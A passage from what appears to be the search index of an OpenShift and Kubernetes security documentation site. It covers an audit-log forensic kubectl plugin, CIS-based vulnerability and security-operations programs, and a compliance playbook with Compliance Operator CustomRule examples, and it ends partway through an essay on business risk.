\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u279c  ~ </p>"},{"location":"auditing/kubectl-timemachine-instructions/","title":"kubectl-timemachine Instructions","text":"<p><code>kubectl-timemachine</code> is a Python-based forensic tool that allows you to reconstruct the state of a Kubernetes cluster at any specific point in time using the Kubernetes Audit Logs. It mimics the <code>kubectl get</code> command but queries historical data from an <code>audit.log</code> file instead of a live API server.</p>"},{"location":"auditing/kubectl-timemachine-instructions/#prerequisites","title":"Prerequisites","text":"<p>Ensure you have Python 3 installed along with the required dependencies:</p> <pre><code>pip install duckdb pyyaml\n</code></pre>"},{"location":"auditing/kubectl-timemachine-instructions/#installation-as-a-kubectl-plugin","title":"Installation as a kubectl Plugin","text":"<p>You can use this tool as a native <code>kubectl</code> plugin.</p> <ol> <li>Rename the script to <code>kubectl-timemachine</code>.</li> <li>Make it executable: <code>chmod +x kubectl-timemachine</code>.</li> <li>Move it to a directory in your <code>$PATH</code> (e.g., <code>/usr/local/bin</code>).</li> </ol> <p>Once installed, you can invoke it directly via <code>kubectl</code>:</p> <pre><code>oc timemachine --auditlog-file=logs/timemachine-demo-audit.log get deployment -n payments-v2 --show-labels\n</code></pre>"},{"location":"auditing/kubectl-timemachine-instructions/#usage","title":"Usage","text":"<p>The basic syntax is similar to <code>kubectl</code>:</p> <pre><code>oc timemachine get &lt;resource&gt; [name] [flags]\n</code></pre>"},{"location":"auditing/kubectl-timemachine-instructions/#common-flags","title":"Common Flags","text":"<ul> <li><code>--auditlog-file &lt;path&gt;</code>: Path to the audit log file (default: <code>audit.log</code>).</li> <li><code>--time &lt;timestamp&gt;</code>: Snapshot time (e.g., <code>2025-12-08T16:00:00</code>). Automatically detects local timezone and converts to UTC.</li> <li><code>-n, --namespace &lt;ns&gt;</code>: Filter by a specific namespace.</li> <li><code>-A, --all-namespaces</code>: List resources across all namespaces.</li> <li><code>-o, --output &lt;format&gt;</code>: Output format. Supported values: <code>table</code> (default), <code>yaml</code>, <code>json</code>, <code>wide</code>.</li> <li><code>-l, --selector &lt;selector&gt;</code>: Filter by label selector (e.g., <code>app=visa,tier=backend</code>).</li> <li><code>--show-labels</code>: Show all labels as the last column in the output.</li> <li><code>--history</code>: Trace the full lineage of a resource (e.g., Pod -&gt; ReplicaSet -&gt; Deployment) and show a merged event history.</li> </ul>"},{"location":"auditing/kubectl-timemachine-instructions/#examples","title":"Examples","text":""},{"location":"auditing/kubectl-timemachine-instructions/#1-list-all-pods-in-the-default-namespace-latest-state-in-logs","title":"1. List all pods in the default namespace (latest state in logs)","text":"<pre><code>oc timemachine --auditlog-file=logs/timemachine-demo-audit.log get pods\n</code></pre>"},{"location":"auditing/kubectl-timemachine-instructions/#2-list-pods-in-all-namespaces","title":"2. List pods in all namespaces","text":"<pre><code>oc timemachine --auditlog-file=logs/timemachine-demo-audit.log get pods -A\n</code></pre>"},{"location":"auditing/kubectl-timemachine-instructions/#3-time-travel-see-the-state-of-deployments-at-a-specific-time","title":"3. Time Travel: See the state of deployments at a specific time","text":"<p>View what deployments existed yesterday at 4:00 PM (Local Time). The tool automatically detects your timezone and converts it to UTC.</p> <pre><code>oc timemachine --auditlog-file=logs/timemachine-demo-audit.log get deployments -A --time \"2025-12-08T16:00:00\"\n</code></pre> <p>Output: <code>--- \ud83d\udd52 Snapshot: 2025-12-08 16:00:00 (Local) \u2192 2025-12-08 12:00:00Z (UTC) ---</code></p>"},{"location":"auditing/kubectl-timemachine-instructions/#4-recover-a-deleted-resource-manifest","title":"4. Recover a deleted resource manifest","text":"<p>If a ConfigMap was deleted, you can retrieve its last known state and output it as YAML: <pre><code>oc timemachine --auditlog-file=logs/timemachine-demo-audit.log get cm my-config -n my-app -o yaml &gt; recovered-config.yaml\n</code></pre></p>"},{"location":"auditing/kubectl-timemachine-instructions/#5-specify-a-custom-audit-log-file","title":"5. Specify a custom audit log file","text":"<pre><code>oc timemachine --auditlog-file=logs/timemachine-demo-audit.log get nodes\n</code></pre>"},{"location":"auditing/kubectl-timemachine-instructions/#6-get-all-resources","title":"6. Get All Resources","text":"<p>Retrieve a comprehensive overview of the cluster state (similar to <code>kubectl get all</code>): <pre><code>oc timemachine --auditlog-file=logs/timemachine-demo-audit.log get all -A\n</code></pre></p>"},{"location":"auditing/kubectl-timemachine-instructions/#7-advanced-filtering-and-output","title":"7. Advanced Filtering and Output","text":"<p>List pods with extra details (IP, Node) matching a specific label: <pre><code>oc timemachine --auditlog-file=logs/timemachine-demo-audit.log get pods -n payments -l app=visa -o wide\n</code></pre></p>"},{"location":"auditing/kubectl-timemachine-instructions/#8-show-labels","title":"8. Show Labels","text":"<p>Display labels alongside resource information: <pre><code>oc timemachine --auditlog-file=logs/timemachine-demo-audit.log get pods --show-labels\n</code></pre></p>"},{"location":"auditing/kubectl-timemachine-instructions/#9-trace-resource-history-lineage","title":"9. Trace Resource History &amp; Lineage","text":"<p>Recursively trace the ownership of a resource (e.g., Pod -&gt; ReplicaSet -&gt; Deployment) and view a merged timeline of all events. This is useful for understanding the lifecycle of a workload.</p> <pre><code>oc timemachine --auditlog-file=logs/timemachine-demo-audit.log get pods -n payments-v2 visa-processor --history\n</code></pre> <p>Output: <pre><code>--- \ud83d\udd0d Analyzing Lineage (this may take a moment) ---\n\n--- HISTORY &amp; LINEAGE: pods/visa-processor ---\nTIMESTAMP                    VERB      OBJECT                                         USER                            STATUS      \n2025-12-09T12:57:37.324537Z  CREATE    pods/visa-processor                            sa:visa-processor               Created     \n2025-12-09T12:57:46.770676Z  CREATE    pods/visa-processor/exec                       sa:visa-processor               Exec        \n2025-12-09T12:57:46.770676Z  CREATE    pods/visa-processor/exec                       sa:visa-processor               Exec        \n</code></pre></p>"},{"location":"auditing/kubectl-timemachine-instructions/#supported-resources","title":"Supported Resources","text":"<p>The tool currently supports the following resources (and their short aliases):</p> <p>Core: - <code>pods</code> (po) - <code>services</code> (svc) - <code>configmaps</code> (cm) - <code>serviceaccounts</code> (sa) - <code>namespaces</code> (ns) - <code>nodes</code> (no) - <code>secrets</code> (se) - <code>persistentvolumes</code> (pv) - <code>persistentvolumeclaims</code> (pvc) - <code>clusterrolebindings</code> (crb)</p> <p>Workloads: - <code>deployments</code> (deploy) - <code>daemonsets</code> (ds) - <code>statefulsets</code> (sts) - <code>replicasets</code> (rs) - <code>jobs</code> - <code>cronjobs</code> (cj)</p> <p>Network: - <code>ingresses</code> (ing) - <code>routes</code> (rt) - <code>networkpolicies</code> (netpol)</p> <p>Virtualization: - <code>virtualmachines</code> (vm) - <code>virtualmachineinstances</code> (vmi)</p> <p>Special: - <code>all</code> (aggregates common resources)</p>"},{"location":"auditing/loki/","title":"Index","text":"<p>{job=\"audit-logs\"}    |= \"403\"    | json ip=\"sourceIPs[0]\", user=\"user.username\", resource=\"objectRef.resource\"   | ip != \"\"    | user !~ \".openshift.|.kube-.\"   | line_format \"IP: {{.ip}} | USER: {{.user}} | RESOURCE: {{.resource}}\"</p>"},{"location":"cis/cis-ContinuousVulnerabilityManagement/","title":"The CIS-Driven Vulnerability Management Program (VMP)","text":""},{"location":"cis/cis-ContinuousVulnerabilityManagement/#the-cis-driven-vulnerability-management-program-vmp","title":"The CIS-Driven Vulnerability Management Program (VMP)","text":"<p>Framework Reference: CIS Control 07 (v8): Continuous Vulnerability Management</p> <p>This program is built on four distinct \"Workstreams\" that transition the organization from a reactive posture to a data-driven security program.</p>"},{"location":"cis/cis-ContinuousVulnerabilityManagement/#1-the-inventory-baseline-cis-control-71","title":"1. The Inventory Baseline (CIS Control 7.1)","text":"<p>Goal: You cannot secure what you haven't identified.</p> <ul> <li>The Rule: Maintain a clear list of every container image authorized to run in the cluster.</li> <li>The Action: Create a \"Namespace Registry.\" Every OpenShift project must have a designated Technical Owner.</li> <li>The Response: If the tool finds a vulnerability, identify the owner. If no owner exists, the container is unauthorized (CIS 7.1) and should be decommissioned.</li> </ul>"},{"location":"cis/cis-ContinuousVulnerabilityManagement/#2-automated-vulnerability-scanning-cis-control-75","title":"2. Automated Vulnerability Scanning (CIS Control 7.5)","text":"<p>Goal: Use the tool for continuous discovery.</p> <ul> <li>The Rule: Perform automated scans of all software at least weekly (or more frequently).</li> <li>The Action: Schedule automated scans to run continuously across all environments (Dev, Test, Prod).</li> <li>The Response: Review the \"Top Risk\" dashboard every Monday morning. This is your \"Weekly Risk Review.\"</li> </ul>"},{"location":"cis/cis-ContinuousVulnerabilityManagement/#3-risk-based-triage-cis-control-72","title":"3. Risk-Based Triage (CIS Control 7.2)","text":"<p>Goal: Shift focus from total CVE volume to Exploitable Risks.</p> <ul> <li>The Rule: Prioritize remediation based on the risk to the enterprise.</li> <li>The Action (Risk Prioritization): Use a Risk Scoring Criteria to decide what to fix:</li> <li>Severity: Is it a 9.0+ CVSS (Critical)?</li> <li>Exploitability: Is there a Workable PoC, Weaponized Exploit, or Known Exploit in the wild?</li> <li>Exposure: Is the asset Internet-Facing or missing Network Policies?</li> <li> <p>Fixability: Is there an available patch or newer version?</p> </li> <li> <p>The Response: If a CVE meets all four criteria, it is designated as Critical Priority. Everything else is secondary.</p> </li> </ul>"},{"location":"cis/cis-ContinuousVulnerabilityManagement/#4-the-remediation-cis-control-77","title":"4. The Remediation (CIS Control 7.7)","text":"<p>Goal: Define the \"Time-to-Remediate\" and the path to closure.</p> <ul> <li>The Action (The SLA): The organization must agree on these windows:</li> <li>Critical Risk: Fix within 3 to 7 Days.</li> <li> <p>High Risk: Fix within 30 Days.</p> </li> <li> <p>The Closure Paths: Every finding must end in one of three ways:</p> </li> <li>Path A (Patch): Developer updates the image/code.</li> <li>Path B (Mitigate): The team applies Compensating Controls (e.g., Network Policies or SCCs).</li> <li> <p>Path C (Accept): A business leader signs off on the risk for a set time period.</p> </li> <li> <p>The Response: If a \"Critical\" persists past Day 7, it is escalated as a Policy Violation.</p> </li> </ul>"},{"location":"cis/cis-ContinuousVulnerabilityManagement/#cis-control-7-vulnerability-triage-flowchart-simplified-example","title":"CIS Control 7: Vulnerability Triage Flowchart - Simplified Example","text":"<pre><code>graph TD\n    %% Step 1: Detection\n    A[&lt;b&gt;New Vulnerability Identified&lt;/b&gt;&lt;br/&gt;RHACS / OpenShift Scan] --&gt; B{Has Technical&lt;br/&gt;Owner?}\n    B -- NO --&gt; C[&lt;b&gt;DECOMMISSION&lt;/b&gt;&lt;br/&gt;Unauthorized Container]\n    B -- YES --&gt; D[&lt;b&gt;Step 2: Risk Prioritization&lt;/b&gt;]\n\n    %% Step 2: Triage\n    subgraph Triage_Logic [CIS 7.2: Risk-Based Priority]\n    D --&gt; E{Critical 9.0+ &lt;b&gt;AND&lt;/b&gt;&lt;br/&gt;Exploit / PoC &lt;b&gt;AND&lt;/b&gt;&lt;br/&gt;Exposure / No NetPol &lt;b&gt;AND&lt;/b&gt;&lt;br/&gt;Available Patch?}\n    end\n\n    E -- NO --&gt; F[&lt;b&gt;STANDARD PATH&lt;/b&gt;&lt;br/&gt;Add to Backlog / Next Sprint]\n    E -- YES --&gt; G[&lt;b&gt;URGENT PATH&lt;/b&gt;&lt;br/&gt;Move to Remediation]\n\n    %% Step 3: Remediation\n    subgraph Remediation_Options [CIS 7.7: Remediation &amp; Closure]\n    G --&gt; H{Choose Path}\n    H --&gt; I[&lt;b&gt;PATH A: PATCH&lt;/b&gt;&lt;br/&gt;Update Image/Code]\n    H --&gt; J[&lt;b&gt;PATH B: MITIGATE&lt;/b&gt;&lt;br/&gt;Apply Network Policy/SCC]\n    H --&gt; K[&lt;b&gt;PATH C: ACCEPT&lt;/b&gt;&lt;br/&gt;Executive Sign-off Required]\n    end\n\n    I --&gt; L[&lt;b&gt;Step 4: Verification&lt;/b&gt;]\n    J --&gt; L\n    K --&gt; L\n\n    %% Step 4: Verification &amp; SLA\n    L --&gt; M{SLA Met?&lt;br/&gt;3-7 Days}\n    M -- YES --&gt; N((&lt;b&gt;CLOSED / COMPLIANT&lt;/b&gt;))\n    M -- NO --&gt; O[&lt;b&gt;POLICY VIOLATION&lt;/b&gt;&lt;br/&gt;Escalate to Management]\n\n    %% Styling\n    style C fill:#f66,stroke:#333,stroke-width:2px\n    style N fill:#9f9,stroke:#333,stroke-width:2px\n    style O fill:#ff9,stroke:#f66,stroke-width:2px\n    style G fill:#f96,stroke:#333,stroke-width:2px\n</code></pre>"},{"location":"cis/cis-ContinuousVulnerabilityManagement/#summary","title":"Summary","text":"<p>\"Security tools provide the data; the Vulnerability Management Program provides the decision framework. By applying a strict Risk Prioritization process, we convert thousands of raw alerts into a manageable set of actionable tasks focused on actual business risk.\"</p>"},{"location":"cis/cis-DrivenSecurityOperationsProgram/","title":"The CIS-Driven Security Operations Program","text":""},{"location":"cis/cis-DrivenSecurityOperationsProgram/#the-cis-driven-security-operations-program","title":"The CIS-Driven Security Operations Program","text":"<p>Framework Reference: CIS - v8</p> <p>The CIS Center for Internet Security Top 18 Critical Security Controls (v8) are a prioritized framework of best practices designed to stop the most common and pervasive cyberattacks. These 18 controls, organized into Basic, Foundational, and Organizational categories, focus on actionable, technical, and administrative safeguards for essential cyber hygiene, moving from asset management to advanced threat defense.</p>"},{"location":"cis/cis-DrivenSecurityOperationsProgram/#the-18-cis-critical-security-controls-v8","title":"The 18 CIS Critical Security Controls (v8):","text":"<ol> <li>Inventory and Control of Enterprise Assets: Actively manage all hardware devices.</li> <li>Inventory and Control of Software Assets: Actively manage all software.</li> <li>Data Protection: Identify, classify, and protect sensitive data.</li> <li>Secure Configuration of Enterprise Assets and Software: Maintain hardened security settings.</li> <li>Account Management: Manage, monitor, and restrict user accounts.</li> <li>Access Control Management: Control access to assets and data.</li> <li>Continuous Vulnerability Management: Assess and remediate vulnerabilities.</li> <li>Audit Log Management: Collect and analyze logs to detect threats.</li> <li>Email and Web Browser Protections: Secure web and email tools.</li> <li>Malware Defenses: Prevent or detect malicious code execution.</li> <li>Data Recovery: Implement data backup and recovery.</li> <li>Network Infrastructure Management: Secure network devices.</li> <li>Network Monitoring and Defense: Defend against network threats.</li> <li>Security Awareness and Skills Training: Train personnel on security risks.</li> <li>Service Provider Management: Manage service provider security.</li> <li>Application Software Security: Secure internally developed or acquired software.</li> <li>Incident Response Management: Plan and execute incident response.</li> <li>Penetration Testing: Test effectiveness of security controls.</li> </ol> <p>The controls are implemented in three Implementation Groups (IGs) to accommodate different resource levels, with IG1 representing essential cyber hygiene. </p> <p>This program is built on four \"Workstreams\" that turn RHACS data into a repeatable operational rhythm. These workstreams rely on the CIS Controls to focus efforts on the most critical security functions.</p>"},{"location":"cis/cis-DrivenSecurityOperationsProgram/#1-the-asset-software-baseline-cis-controls-1-2","title":"1. The Asset &amp; Software Baseline (CIS Controls 1 &amp; 2)","text":"<p>Goal: Define what is \"Authorized\" versus \"Unauthorized.\"</p> <ul> <li>The Rule: No container runs without a Technical Owner and an Approved Registry source.</li> <li>The Action: Use RHACS to identify \"Orphaned\" deployments (no owner) or images from \"Public/Unscanned\" registries.</li> <li>The Response: If a deployment violates these rules, it is flagged for Decommissioning.</li> </ul>"},{"location":"cis/cis-DrivenSecurityOperationsProgram/#2-configuration-hardening-cis-control-4","title":"2. Configuration Hardening (CIS Control 4)","text":"<p>Goal: Eliminate Misconfigurations that increase the attack surface.</p> <ul> <li>The Rule: All workloads must meet the CIS OpenShift Benchmark (e.g., No Root, No Host IPC).</li> <li> <p>The Action: Focus on the Critical Security Violations in the RHACS \"Violations\" tab.</p> <ol> <li>Privileged Containers.</li> <li>Containers running as Root.</li> <li>Host Mounts (Writable).</li> <li>Missing Network Policies.</li> <li>No Resource Limits.</li> <li>Secrets as Environment Variables.</li> <li>Host Network Access (<code>hostNetwork: true</code>).</li> <li>Privilege Escalation Allowed (<code>allowPrivilegeEscalation</code>).</li> <li>Dangerous Capabilities (e.g., <code>CAP_SYS_ADMIN</code>, <code>NET_ADMIN</code>).</li> </ol> </li> <li> <p>The Response: These are not patches; these are YAML changes. The SRE team must update the Deployment or use OpenShift SCCs to block these behaviors.</p> </li> </ul>"},{"location":"cis/cis-DrivenSecurityOperationsProgram/#3-continuous-vulnerability-management-cis-control-7","title":"3. Continuous Vulnerability Management (CIS Control 7)","text":"<p>Goal: Prioritize Critical Exploitable Vulnerabilities and reduce alert fatigue.</p> <ul> <li> <p>The Rule: Follow the Risk Prioritization logic (Critical + Exploited + Exposed + Fixable).</p> </li> <li> <p>The Action (The SLA):</p> <ul> <li>Critical Risk: Fix within 3\u20137 Days.</li> <li>High Risk: Fix within 30 Days.</li> </ul> </li> <li> <p>The Response: Use the Remediation Paths:</p> <ul> <li>Patch: Update the image.</li> <li>Mitigate: Apply a Network Policy to block access to the vulnerable port.</li> <li>Accept: Formal sign-off for business-critical apps that can't be patched.</li> </ul> </li> </ul>"},{"location":"cis/cis-DrivenSecurityOperationsProgram/#4-network-runtime-defense-cis-controls-13-17","title":"4. Network &amp; Runtime Defense (CIS Controls 13 &amp; 17)","text":"<p>Goal: Detect and Respond to Anomalous Activity in real-time.</p> <ul> <li>The Rule: Any process or network traffic not in the \"Baseline\" triggers an alert.</li> <li>The Action: Use the RHACS Network Graph to generate \"Baseline\" policies. Anything outside that (e.g., a pod trying to talk to an external IP) is a violation of CIS 13.</li> <li>The Response: If RHACS triggers a Runtime Alert (e.g., \"Cryptomining process detected\"), this bypasses the standard SLA and moves immediately to your Incident Response (CIS 17) process.</li> </ul>"},{"location":"cis/cis-DrivenSecurityOperationsProgram/#simplified-decision-matrix","title":"Simplified Decision Matrix","text":"<p>When faced with a high volume of alerts, use this logic to determine the immediate course of action:</p> <p>\"Is this a CVE or a Configuration Violation?\" * If CVE: Check for Fixability, Exploitability &amp; Exposure. (If yes, adhere to the 7-day remediation SLA). * If Configuration: Check if it involves Privileged Access or Root. (If yes, harden the deployment manifest). * If neither: Add to the backlog and defer for future review.</p>"},{"location":"compliance/","title":"The 10 Essential Controls: A Unified Kubernetes Security Playbook","text":"<p>A secure Kubernetes platform is not built by chasing individual checkboxes for every new regulation. It is built by layering a continuous set of controls that satisfy the intent of almost every major framework simultaneously.</p> <p>Whether you are aligning to PCI, ISO, NIST, or CIS, the fundamentals are identical: verify what you run, harden how it runs, restrict who can do what, and prove the platform\u2019s behavior over time. The following 10 areas represent a \"write once, comply everywhere\" strategy using OpenShift native capabilities.</p>"},{"location":"compliance/#1-the-trusted-supply-chain","title":"1. The Trusted Supply Chain","text":"<p>Security starts before the cluster even sees a workload. If you don't trust the source, you can't trust the runtime.</p> <p>The Risk: Mitigates Supply Chain Vulnerabilities. Attackers often compromise third-party images or dependencies to bypass perimeter defenses, injecting malicious code before deployment even occurs.</p> <ul> <li>Provenance: Every image must come from an allowed registry, pinned by digest (immutable), and signed.</li> <li>Vulnerability Gating: Images with critical, fixable vulnerabilities are blocked at the pipeline level. This eliminates the \"unknowns\" before they ever reach deployment.</li> </ul>"},{"location":"compliance/#2-hardened-configuration","title":"2. Hardened Configuration","text":"<p>A trusted image configured insecurely is still a vulnerability.</p> <p>The Risk: Prevents Container Escape. Misconfigured workloads (e.g., running as root or privileged) allow attackers to break out of the container boundary, gain control of the underlying node, and compromise the entire cluster.</p> <ul> <li>Guardrails: OpenShift\u2019s Security Context Constraints (SCC) and Pod Security Admission prevent dangerous configurations by default.</li> <li>Enforcement: Capabilities like running as root, privilege escalation, or accessing host filesystems are blocked automatically, aligning the platform with CIS benchmarks without manual intervention.</li> </ul>"},{"location":"compliance/#3-identity-least-privilege","title":"3. Identity &amp; Least Privilege","text":"<p>Identity is the new perimeter.</p> <p>The Risk: Stops Privilege Escalation. Attackers hunt for over-privileged accounts (like a CI/CD service account with admin rights). If they find one, they can silently elevate their access to take over the entire domain.</p> <ul> <li>RBAC: Every action is tied to an explicit permission. \"Cluster-admin\" access is severely restricted to a break-glass role.</li> <li>Service Accounts: Workload identities are scoped tightly. This removes silent privilege expansion and ensures that every administrative action is predictable and defensible.</li> </ul>"},{"location":"compliance/#4-network-governance","title":"4. Network Governance","text":"<p>Flat networks are a gift to attackers. If one pod is compromised, the rest shouldn't be accessible.</p> <p>The Risk: Limits Lateral Movement. In an unsegmented network, a breach in a minor web frontend allows an attacker to directly probe sensitive backend databases or internal management APIs.</p> <ul> <li>Segmentation: NetworkPolicy enforces a \"default deny\" posture.</li> <li>Global Control: AdminNetworkPolicy allows security teams to enforce mandatory blocking rules that developers cannot override, making segmentation code-defined, testable, and compliant.</li> </ul>"},{"location":"compliance/#5-resource-availability","title":"5. Resource Availability","text":"<p>Security includes availability. A runaway process crashing a node is a Denial of Service (DoS) event.</p> <p>The Risk: Prevents Denial of Service (DoS). Without limits, a compromised or buggy pod can consume all available CPU/RAM, starving critical security components (like logging agents) and causing nodes to crash.</p> <ul> <li>Stability: LimitRanges and ResourceQuotas enforce boundaries on CPU and memory.</li> <li>Fairness: These controls prevent \"noisy neighbors\" and ensure critical compliance workloads always have the resources they need to run.</li> </ul>"},{"location":"compliance/#6-vulnerability-lifecycle","title":"6. Vulnerability Lifecycle","text":"<p>Software ages like milk, not wine. Clean images eventually reveal new CVEs.</p> <p>The Risk: Addresses Vulnerable Application Components. Attackers automate the scanning of public endpoints for known, unpatched vulnerabilities (like Log4j). Static software eventually becomes a \"sitting duck.\"</p> <ul> <li>Continuous Scanning: Runtime scanning detects risks that appear after deployment.</li> <li>SLA Enforcement: The goal isn't zero bugs; it's consistent remediation (e.g., \"Criticals fixed in 7 days\") driven by automated reporting.</li> </ul>"},{"location":"compliance/#7-runtime-defense","title":"7. Runtime Defense","text":"<p>Static analysis can't catch zero-days or logic flaws. You need to see what happens when code runs.</p> <p>The Risk: Detects Silent Persistence. Static tools miss \"fileless\" attacks or zero-day exploits. Without runtime visibility, an attacker can dwell inside a running container for months, exfiltrating data without ever modifying a file.</p> <ul> <li>Behavioral Monitoring: Runtime tools detect unexpected shells, crypto-mining patterns, or suspicious network calls.</li> <li>Incident Response: These alerts link directly to operational workflows, proving to auditors that you are actively watching the shop.</li> </ul>"},{"location":"compliance/#8-secret-management","title":"8. Secret Management","text":"<p>Credentials are the keys to the kingdom.</p> <p>The Risk: Prevents Credential Theft. Hardcoded secrets in Git or environment variables are easily scraped. Once stolen, these keys allow attackers to bypass controls and access external sensitive data directly.</p> <ul> <li>Encryption: Secrets are encrypted at rest and never embedded in container images or Git.</li> <li>Rotation: Integration with external secret managers ensures credentials are short-lived, minimizing the blast radius of any leak.</li> </ul>"},{"location":"compliance/#9-audit-evidence","title":"9. Audit &amp; Evidence","text":"<p>If you didn't log it, it didn't happen.</p> <p>The Risk: Eliminates the Compliance Blind Spot. If logs are missing or mutable, you cannot investigate a breach, nor can you prove to auditors that a breach didn't happen.</p> <ul> <li>Immutability: Audit logs, event streams, and infrastructure logs are shipped to immutable external storage.</li> <li>Reproducibility: You can answer \"Who, What, When, and How\" for every change, which is the foundation of every audit.</li> </ul>"},{"location":"compliance/#10-governance-exceptions","title":"10. Governance &amp; Exceptions","text":"<p>Rigid rules break. Smart rules bend but track the variance.</p> <p>The Risk: Controls Policy Drift. \"Temporary\" fixes often become permanent backdoors. Without a lifecycle for exceptions, the platform slowly accumulates security debt until strict policies are no longer effective.</p> <ul> <li>Discipline: Exceptions (e.g., a temporary privileged pod) are formally tracked with justification and expiry dates.</li> <li>Findings: When an exception expires, it becomes a finding. This prevents temporary allowances from becoming permanent, silent risks.</li> </ul>"},{"location":"compliance/#automating-the-audit-the-compliance-operator","title":"Automating the Audit: The Compliance Operator","text":"<p>Implementing these controls is step one. Proving them continuously is step two.</p> <p>Most frameworks ask for similar things, which is why the Compliance Operator is essential. It automates the \"boring\" work of checking your cluster against standard profiles (CIS, PCI-DSS, NIST) and producing the evidence auditors expect.</p> <p>However, real-world compliance is rarely just \"vanilla CIS.\" Auditors often have unique, organization-specific demands that standard profiles miss.</p>"},{"location":"compliance/#going-beyond-standard-profiles-customrules","title":"Going Beyond Standard Profiles: CustomRules","text":"<p>What happens when your security team requires something unique?</p> <ul> <li>\u201cShow me that no developers have access to the <code>central-db</code> namespace.\u201d</li> <li>\u201cProve that only the SRE team has <code>cluster-admin</code> rights.\u201d</li> <li>\u201cEnsure no application is running a 'shadow' database outside of approved areas.\u201d</li> </ul> <p>Historically, this meant writing brittle bash scripts or manual verification. Now, with the CustomRule CRD (currently in Tech Preview), you can codify these bespoke policies using the Common Expression Language (CEL) and run them alongside your standard compliance scans.</p>"},{"location":"compliance/#how-customrules-work","title":"How CustomRules Work","text":"<p>A <code>CustomRule</code> allows you to write simple logic to check Kubernetes resources. The operator runs these rules and reports success or failure just like it does for a standard CIS check.</p>"},{"location":"compliance/#example-1-the-cluster-admin-audit","title":"Example 1: The \"Cluster-Admin\" Audit","text":"<p>This rule enforces a strict allow-list for the <code>cluster-admin</code> role. It fails if anyone not on the list holds that permission.</p> <pre><code>apiVersion: compliance.openshift.io/v1alpha1\nkind: CustomRule\nmetadata:\n  name: cluster-admin-allow-list\nspec:\n  title: Audit cluster-admin access against an allow-list\n  severity: high\n  scannerType: CEL\n  inputs:\n    - name: crbs\n      kubernetesInputSpec:\n        apiVersion: rbac.authorization.k8s.io/v1\n        resource: clusterrolebindings\n  expression: |-\n    crbs.items.filter(crb, crb.metadata.name == 'cluster-admin')[0]\n      .subjects.all(subject,\n        (subject.kind == 'User' &amp;&amp; subject.name in ['kubeadmin', 'alice@company.com']) ||\n        (subject.kind == 'Group' &amp;&amp; subject.name in ['system:masters', 'sre-team'])\n      )\n</code></pre>"},{"location":"compliance/#example-2-the-shadow-database-detector","title":"Example 2: The \"Shadow Database\" Detector","text":"<p>This rule scans application namespaces to ensure no one is spinning up unapproved databases (like Postgres or Mongo) outside of the dedicated database team's control.</p> <pre><code>apiVersion: compliance.openshift.io/v1alpha1\nkind: CustomRule\nmetadata:\n  name: disallow-shadow-databases\nspec:\n  title: Disallow Unapproved Database Pods\n  severity: high\n  scannerType: CEL\n  inputs:\n    - name: pods\n      kubernetesInputSpec:\n        apiVersion: v1\n        resource: pods\n  expression: |\n    pods.items.all(pod,\n      pod.metadata.namespace in ['central-dba-prod'] ||\n      pod.spec.containers.all(c, \n        !['postgres','mysql','mongo','redis'].exists(db, c.image.contains(db))\n      )\n    )\n</code></pre>"},{"location":"compliance/#the-workflow-from-yaml-to-evidence","title":"The Workflow: From YAML to Evidence","text":"<ol> <li>Define: Create your <code>CustomRule</code> manifests (like the examples above).</li> <li>Bundle: Add them to a <code>TailoredProfile</code>. This tells the operator, \"Run the standard CIS checks, but also run my custom SQL check.\"</li> <li>Scan: Bind the profile to a <code>ScanSetting</code> and let it run.</li> <li>Report: Review the results via <code>oc get compliancecheckresults</code>.</li> </ol>"},{"location":"compliance/#summary","title":"Summary","text":"<p>By combining the 10 Essential Controls with the Compliance Operator, you move from \"Compliance as a barrier\" to \"Compliance as code.\" You verify the foundation with native controls, and you prove the specific, unique requirements of your organization with CustomRules\u2014all in one automated workflow.</p>"},{"location":"compliance/#further-reading-demos","title":"Further Reading &amp; Demos","text":"<ul> <li>Compliance Operator CustomRule Demo</li> </ul>"},{"location":"compliance/The%20Risk-Driven%20Business%20Conversation/","title":"The Risk-Driven Business Conversation","text":""},{"location":"compliance/The%20Risk-Driven%20Business%20Conversation/#the-6-strategic-risk-conversations","title":"The 6 Strategic Risk Conversations","text":""},{"location":"compliance/The%20Risk-Driven%20Business%20Conversation/#1-the-certainty-risk-supply-chain-transparency","title":"1. The \"Certainty\" Risk (Supply Chain &amp; Transparency)","text":"<p>Every modern application is a puzzle of open-source parts. Most organizations have no real \"Chain of Custody.\" If a malicious library injection hits the news tomorrow, how long is your Time to Certainty? Can you identify every affected application in minutes, or will your senior team spend weeks manually checking spreadsheets while your board waits for an answer?</p> <p>If you cannot prove what is running in your data center, you cannot guarantee your services are safe. This lack of visibility forces a choice between staying online and risking a breach, or shutting down and losing revenue. Without certainty, you lose the License to Operate.</p>"},{"location":"compliance/The%20Risk-Driven%20Business%20Conversation/#2-the-human-error-risk-hardening-isolation","title":"2. The \"Human Error\" Risk (Hardening &amp; Isolation)","text":"<p>In a high-speed DevOps culture, we rely on developers \"doing the right thing\" under tight deadlines. But security shouldn't rely on human memory. If a single engineer accidentally configures a container to run with administrative privileges, does your platform have the automatic safety brakes to stop it? Or is your entire infrastructure now vulnerable because of one person's honest mistake at 2:00 AM?</p> <p>Relying on human discipline for infrastructure safety is a high-stakes gamble. A single misconfiguration can turn a minor app flaw into a Total System Compromise, leading to catastrophic recovery costs and potential legal liability for gross negligence.</p>"},{"location":"compliance/The%20Risk-Driven%20Business%20Conversation/#3-the-identity-perimeter-risk-access-least-privilege","title":"3. The \"Identity Perimeter\" Risk (Access &amp; Least Privilege)","text":"<p>We often focus on the \"Front Door,\" but what about the \"Internal Keys\"? If a developer's credentials or a service account token is stolen tonight, can that person delete your production backups, or is their access limited strictly to their specific project? Is your identity management a solid wall or a messy web of over-privileged accounts?</p> <p>Administrative \"bloat\" is a silent killer. This risk is about Financial Exposure Control. If a credential is lost, the \"blast radius\" must be limited to a single room, not the whole building. Failure here leads to total 